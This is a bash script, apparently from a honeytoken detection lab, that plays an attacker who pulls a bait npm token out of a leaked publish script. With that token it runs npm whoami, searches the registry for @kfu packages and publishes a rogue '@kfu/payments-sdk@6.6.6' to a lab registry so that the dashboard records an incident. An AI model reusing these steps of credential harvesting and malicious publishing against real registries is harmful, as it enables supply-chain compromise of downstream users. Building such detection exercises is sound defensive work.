#!/usr/bin/env bash
# Scenario 3: a leaked publish script (attacker container 172.30.0.88).
# Someone got a copy of ops/release-tools/scripts/publish.sh, which holds BAIT-PUB-03.
# They test the npm token, look around the registry, then publish a package.
#   docker compose exec attacker3 bash /work/scenario3.sh
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

intro "Scenario 3: leaked publish script"

LOOT="$HERE/loot/release-publish.sh"
[ -s "$LOOT" ] || die "$LOOT is missing. Run 'bash env/setup.sh' on the host first."
NPM_TOKEN="$(sed -n 's/^export NPM_TOKEN=//p' "$LOOT" | tr -d '\r')"
[ -n "$NPM_TOKEN" ] || die "No NPM_TOKEN in $LOOT. Run 'bash env/setup.sh' on the host first."
make_workdir
write_npmrc "$NPM_TOKEN"

step 1 4 "Checking who the npm token belongs to (npm whoami)"
run_npm whoami --registry "$NPM_URL" | sed 's/^/    /'
pause

step 2 4 "Searching the registry for @kfu packages"
run_npm search @kfu --registry "$NPM_URL" | sed 's/^/    /'
pause

step 3 4 "Installing @kfu/payments-sdk"
install_package "@kfu/payments-sdk"
pause

step 4 4 "Publishing @kfu/payments-sdk@6.6.6 with that token"
make_package "$WORK/evil-sdk" "@kfu/payments-sdk" "6.6.6"
(cd "$WORK/evil-sdk" && run_npm publish --registry "$NPM_URL") | sed 's/^/    /'

echo
echo "Done. Check the dashboard: one incident at the publish stage."
